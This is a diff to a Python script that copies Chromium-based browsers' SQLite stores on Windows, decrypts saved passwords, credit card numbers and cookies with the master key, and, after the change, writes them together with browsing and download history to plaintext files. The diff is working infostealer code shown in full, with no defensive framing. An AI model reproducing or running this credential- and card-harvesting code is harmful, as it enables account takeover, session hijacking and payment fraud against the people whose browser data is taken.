@@ -56,25 +56,36 @@ def decrypt_password(buff: bytes, master_key: bytes) -> str:
     return decrypted_pass
 
 
+def save_results(browser_name, data_type, content):
+    if not os.path.exists(browser_name):
+        os.mkdir(browser_name)
+    if content is not None:
+        open(f'{browser_name}/{data_type}.txt', 'w').write(content)
+        print(f"\t [*] Saved in {browser}/{data_type}.txt")
+    else:
+        print(f"\t [-] No Data Found!")
+
+
 def get_login_data(path: str, profile: str, master_key):
     login_db = f'{path}\\{profile}\\Login Data'
     if not os.path.exists(login_db):
         return
-
-    print("Saved Passwords")
-    print("*************************")
+    result = ""
     shutil.copy(login_db, 'login_db')
     conn = sqlite3.connect('login_db')
     cursor = conn.cursor()
     cursor.execute('SELECT action_url, username_value, password_value FROM logins')
     for row in cursor.fetchall():
         password = decrypt_password(row[2], master_key)
-        print(f"URL: {row[0]}")
-        print(f"Email: {row[1]}")
-        print(f"Password: {password}")
-        print("-------------------------\n")
+        result += f"""
+        URL: {row[0]}
+        Email: {row[1]}
+        Password: {password}
+        
+        """
     conn.close()
     os.remove('login_db')
+    return result
 
 
 def get_credit_cards(path: str, profile: str, master_key):
@@ -82,58 +93,62 @@ def get_credit_cards(path: str, profile: str, master_key):
     if not os.path.exists(cards_db):
         return
 
+    result = ""
     shutil.copy(cards_db, 'cards_db')
     conn = sqlite3.connect('cards_db')
     cursor = conn.cursor()
     cursor.execute(
         'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
-    print("Stored Credit Cards")
-    print("****************************")
     for row in cursor.fetchall():
         if not row[0] or not row[1] or not row[2] or not row[3]:
             continue
 
         card_number = decrypt_password(row[3], master_key)
-        print("Name On Card: ", row[0])
-        print("Card Number: ", card_number)
-        print(f"Expires On: {row[1]} / {row[2]}")
-        print(f"Added On: {datetime.fromtimestamp(row[4])}")
-        print("---------------------------\n")
+        result += f"""
+        Name On Card: {row[0]}
+        Card Number: {card_number}
+        Expires On:  {row[1]} / {row[2]}
+        Added On: {datetime.fromtimestamp(row[4])}
+        
+        """
 
     conn.close()
     os.remove('cards_db')
+    return result
 
 
 def get_cookies(path: str, profile: str, master_key):
     cookie_db = f'{path}\\{profile}\\Network\\Cookies'
     if not os.path.exists(cookie_db):
         return
-
+    result = ""
     shutil.copy(cookie_db, 'cookie_db')
     conn = sqlite3.connect('cookie_db')
     cursor = conn.cursor()
     cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
-    print("Browser Cookies")
-    print("************************")
     for row in cursor.fetchall():
         if not row[0] or not row[1] or not row[2] or not row[3]:
             continue
 
         cookie = decrypt_password(row[3], master_key)
 
-        print("Host Key : ", row[0])
-        print("Cookie Name : ", row[1])
-        print(f"path : {row[2]}")
-        print(f"Cookie {cookie}")
-        print(f"Expires On : {row[4]}")
-        print("---------------------------\n")
+        result += f"""
+        Host Key : {row[0]}
+        Cookie Name : {row[1]}
+        Path: {row[2]}
+        Cookie: {cookie}
+        Expires On: {row[4]}
+        
+        """
 
     conn.close()
     os.remove('cookie_db')
+    return result
 
 
 def get_web_history(path: str, profile: str):
     web_history_db = f'{path}\\{profile}\\History'
+    result = ""
     if not os.path.exists(web_history_db):
         return
 
@@ -141,38 +156,37 @@ def get_web_history(path: str, profile: str):
     conn = sqlite3.connect('web_history_db')
     cursor = conn.cursor()
     cursor.execute('SELECT url, title, last_visit_time FROM urls')
-    print("Browser History")
-    print("************************")
     for row in cursor.fetchall():
         if not row[0] or not row[1] or not row[2]:
             continue
-
-        print(f"URL: {row[0]}")
-        print(f"Title: {row[1]}")
-        print(f"Visited Time: {row[2]}")
-        print("-----------------")
-
+        result += f"""
+        URL: {row[0]}
+        Title: {row[1]}
+        Visited Time: {row[2]}
+        
+        """
     conn.close()
     os.remove('web_history_db')
+    return result
 
 
 def get_downloads(path: str, profile: str):
     downloads_db = f'{path}\\{profile}\\History'
     if not os.path.exists(downloads_db):
         return
-
+    result = ""
     shutil.copy(downloads_db, 'downloads_db')
     conn = sqlite3.connect('downloads_db')
     cursor = conn.cursor()
     cursor.execute('SELECT tab_url, target_path FROM downloads')
-    print("Browser Download History")
-    print("************************")
     for row in cursor.fetchall():
         if not row[0] or not row[1]:
             continue
-
-        print(f"Download URL: {row[0]}")
-        print(f"Local Path: {row[1]}")
+        result += f"""
+        Download URL: {row[0]}
+        Local Path: {row[1]}
+        
+        """
 
     conn.close()
     os.remove('downloads_db')
@@ -193,12 +207,22 @@ if __name__ == '__main__':
         browser_path = browsers[browser]
         master_key = get_master_key(browser_path)
         print(f"Getting Stored Details from {browser}")
-        get_login_data(browser_path, "Default", master_key)
-        print()
-        get_web_history(browser_path, "Default")
-        print()
-        get_cookies(browser_path, "Default", master_key)
-        print()
-        get_downloads(browser_path, "Default")
-        print()
-        get_credit_cards(browser_path, "Default", master_key)
+
+        print("\t [!] Getting Saved Passwords")
+        save_results(browser, 'Saved_Passwords', get_login_data(browser_path, "Default", master_key))
+        print("\t------\n")
+
+        print("\t [!] Getting Browser History")
+        save_results(browser, 'Browser_History', get_web_history(browser_path, "Default"))
+        print("\t------\n")
+
+        print("\t [!] Getting Download History")
+        save_results(browser, 'Download_History', get_downloads(browser_path, "Default"))
+        print("\t------\n")
+
+        print("\t [!] Getting Cookies")
+        save_results(browser, 'Browser_Cookies', get_cookies(browser_path, "Default", master_key))
+        print("\t------\n")
+
+        print("\t [!] Getting Saved Credit Cards")
+        save_results(browser, 'Saved_Credit_Cards', get_credit_cards(browser_path, "Default", master_key))
